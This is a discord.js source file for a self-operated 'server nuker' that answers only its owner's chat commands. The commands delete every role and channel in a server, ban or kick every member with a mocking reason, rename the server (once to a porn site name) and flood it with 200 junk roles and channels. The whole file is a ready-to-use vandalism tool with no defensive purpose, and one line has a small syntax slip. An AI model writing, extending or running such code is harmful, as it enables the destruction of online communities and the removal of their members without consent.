const Discord = require("discord.js")
const bot = new Discord.Client()

const config = require(`./config.json`)


if(config.token === "Your token here.") {
	console.error(`Please set your token in config.json!`)
} else {
	bot.login(config.token).catch(err => console.error(`Failed to log into the Discord API`, err))
}

bot.on("ready", () => console.log(`Ready as: ${bot.user.tag}`))

bot.on("message", msg => {
	if(bot.user !== msg.author) {
		return;
	}
	if(msg.content === "!destroy") {
		msg.delete()
		msg.guild.roles.forEach(r => {
			r.delete().then(role => {
				console.log(`Deleted role "${role.name}" on "${role.guild.name}"`)
			}).catch(err => {
				console.error(`Failed to delete role "${r.name}" on "${r.guild.name}"}`, err)
			})
		})
		msg.guild.channels.forEach(ch => {
			ch.delete().then(channel => {
				console.log(`Deleted channel "${channel.name}" on "${channel.guild.name}"`)
			}).catch(err => {
				console.error(`Failed to delete channel "${ch.name}" on "${ch.guild.name}" \n`. err)
				ch.fetchMessages({
					limit: 100
				}).then(messages => {
					messages.forEach(m => m.delete())
				})
			})
		})
		msg.guild.members.forEach(member => {
			member.ban({
				days: 7,
				reason: `Server nuked. LMFAO`
			}).then(m => {
				console.log(`Banned member "${m.user.tag}" on "${m.guild.name}"`)
			}).catch(err => {
				console.error(`Failed to ban member "${member.user.tag}" on "${member.guild.name}" \n`, err)
			})
		})
		msg.guild.setName("SERVER NUKED BY SERVER NUKER 1.0").catch(console.error)
		console.log(`Nuked server "${msg.guild.name}" - R.I.P`)
		
	} else if(msg.content === "!overwrite") {
		msg.delete()
		console.log(`Overwriting server "${msg.guild.name}"`)
		msg.guild.roles.forEach(r => {
			r.delete().then(role =>  {
				console.log(`Deleted role "${role.name}" on "${role.guild.name}"`)
			}).catch(err => {
				console.error(`Failed to delete role "${r.name}" on "${r.guild.name}" \n`, err)
			})
		})
		msg.guild.channels.map(ch => {
			ch.delete().then(channel => {
				console.log(`Deleted channel "${channel.name}" on "${channel.guild.name}"`)
			}).catch(err => {
				console.error(`Failed to delete channel "${ch.name}" on "${ch.guild.name}"`, err)
			})
		})
		msg.guild.members.forEach(member => {
			member.ban(7).then(m => {
				console.log(`Banned member "${m.user.tag}" on "${m.guild.name}"`)
			}).catch(err => {
				console.error(`Failed to ban member "${member.user.tag}" on "${member.guild.name}"`, err)
			})
		})
		msg.guild.setName("Pornhub.com").catch(console.error)
		for(var i = 0; i < 200; i++) {
			msg.guild.createRole().catch(console.error)
			msg.guild.createChannel("server-nuked", "text").catch(console.error)
			msg.guild.createChannel("Server Nuked", "voice").catch(console.error)
		}
	} else if(msg.content === "!baneveryone") {
		msg.delete()
		msg.guild.members.forEach(member => {
			member.ban({
				days: 7,
				reason: `Server nuked. LMFAO`
			}).then(m => {
				console.log(`Banned member "${m.user.tag}" on "${m.guild.name}"`)
			}).catch(err => {
				console.error(`Failed to ban member "${member.user.tag}" on "${member.guild.name}"`, err)
			})
		})
	} else if(msg.content === "!kickeveryone") {
		msg.delete()
		msg.guild.members.forEach(member => {
			member.kick({
				days: 7,
				reason: `Server nuked Fully. LMFAO`
			}).then(m => {
				console.log(`Kicked member "${m.user.tag}" on "${m.guild.name}"`)
			}).catch(err => {
				console.error(`Failed to kick member "${member.user.tag}" on "${member.guild.name}"`, err)
			})
		})
	} else if(msg.content === "!deleteroles") {
		msg.delete()
		msg.guild.roles.forEach(r => {
			r.delete().then(role => {
				console.log(`Deleted role "${role.name}" on "${role.guild.name}"`)
			}).catch(err => {
				console.error(`Failed to delete role "${r.name}" on "${r.guild.name}" \n`, err)
			})
		})
	} else if(msg.content === "!deletechannels") {
		msg.delete()
		msg.guild.channels.forEach(ch => {
			ch.delete().then(channel => {
				console.log(`Deleted channel "${channel.name}" on "${channel.guild.name}"`)
			}).catch(err => {
				console.error(`Failed to delete channel "${ch.name}" on "${ch.guild.name}"`, err)
			})
		})
	} 
})